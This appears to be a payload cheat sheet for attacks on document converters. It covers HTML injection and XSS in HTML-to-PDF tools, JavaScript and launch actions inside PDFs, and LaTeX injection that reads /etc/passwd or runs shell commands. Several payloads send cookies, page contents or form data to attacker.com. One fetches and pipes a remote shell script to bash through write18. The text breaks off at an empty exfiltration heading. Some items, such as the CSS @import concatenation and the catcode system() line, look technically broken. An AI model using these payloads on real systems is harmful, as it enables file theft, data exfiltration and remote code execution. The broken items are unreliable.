<xss_in_pdf>
<html_injection>
{% raw %}
# XSS in HTML-to-PDF converters:

# Basic script injection:
<script>
  document.body.innerHTML = '<h1>XSS in PDF</h1>';
</script>

# Fetch and display:
<script>
  fetch('/api/secrets')
    .then(r => r.text())
    .then(d => document.body.innerHTML = d);
</script>

# External script loading:
<script src="http://attacker.com/payload.js"></script>

# Event handlers:
<img src=x onerror="document.body.innerHTML='XSS'">
<body onload="alert('XSS')">

# SVG-based XSS:
<svg onload="fetch('http://attacker.com/?c='+document.cookie)">

# CSS injection for data exfiltration:
<style>
  @import url('http://attacker.com/log?data=' + encodeURIComponent(document.body.innerHTML));
</style>
{% endraw %}
</html_injection>

<pdf_javascript>
{% raw %}
# JavaScript in PDF (Adobe Reader):

# PDF JavaScript action:
/OpenAction << /S /JavaScript /JS (app.alert('XSS');) >>

# Using PDF form fields:
/AcroForm <<
  /Fields [<< /T (field) /V (value) /AA << /K << /S /JavaScript /JS (
    this.exportDataObject({cName: "data", nLaunch: 2});
  ) >> >> >>]
>>

# Launch action:
/OpenAction << /S /Launch /F (cmd.exe) /P (/c calc) >>

# URI action:
/OpenAction << /S /URI /URI (http://attacker.com/?steal=data) >>

# GoTo action with JavaScript:
/OpenAction << /S /GoTo /D [0 /XYZ 0 0 0] /Next << /S /JavaScript /JS (
  var data = this.getField('sensitive').value;
  app.launchURL('http://attacker.com/?d=' + data);
) >> >>
{% endraw %}
</pdf_javascript>
</xss_in_pdf>

<latex_injection>
<latex_attacks>
{% raw %}
# LaTeX injection for file read:

# Read file contents:
\input{/etc/passwd}
\include{/etc/passwd}

# Verbatim file inclusion:
\verbatiminput{/etc/passwd}

# Using lstinputlisting:
\lstinputlisting{/etc/passwd}

# Read with newread:
\newread\file
\openin\file=/etc/passwd
\read\file to\line
\text{\line}
\closein\file

# Loop to read entire file:
\newread\file
\openin\file=/etc/passwd
\loop\unless\ifeof\file
  \read\file to\fileline
  \fileline
\repeat
\closein\file
{% endraw %}
</latex_attacks>

<latex_rce>
{% raw %}
# LaTeX command execution:

# Using write18 (shell escape):
\immediate\write18{id > /tmp/output}
\input{/tmp/output}

# Alternative write18:
\write18{curl http://attacker.com/shell.sh | bash}

# Using special characters:
\catcode`\$=\active
\def${system("whoami")}

# pdflatex with shell escape:
pdflatex --shell-escape document.tex

# Lua LaTeX:
\directlua{os.execute("id")}

# XeLaTeX:
\usepackage{fontspec}
\newfontface\x{|"id > /tmp/out"}
{% endraw %}
</latex_rce>

<latex_exfiltration>
{% raw %}
# Data exfiltration via LaTeX:

